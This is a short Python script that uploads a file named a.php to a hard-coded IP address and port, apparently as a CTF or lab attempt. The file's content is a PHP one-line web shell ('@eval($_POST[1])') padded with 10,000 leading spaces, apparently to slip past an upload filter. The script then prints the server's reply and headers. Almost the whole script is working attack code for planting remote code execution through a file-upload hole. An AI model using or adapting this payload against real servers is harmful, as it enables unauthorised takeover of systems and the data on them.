from requests import post
from concurrent.futures import ThreadPoolExecutor

url = 'http://27.25.151.80:45041/'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
}

files = {
    'upload_file': ('a.php', ' '*10000 + '<?php @eval($_POST[1]);phpinfo(); ?>', 'application/octetstream')
}
response = post(url, headers=headers, files=files)
print(response.text)
print(response.reason) 
for k, v in dict(response.headers).items():
    print(f" {k}: {v}") 
    print(response.text)
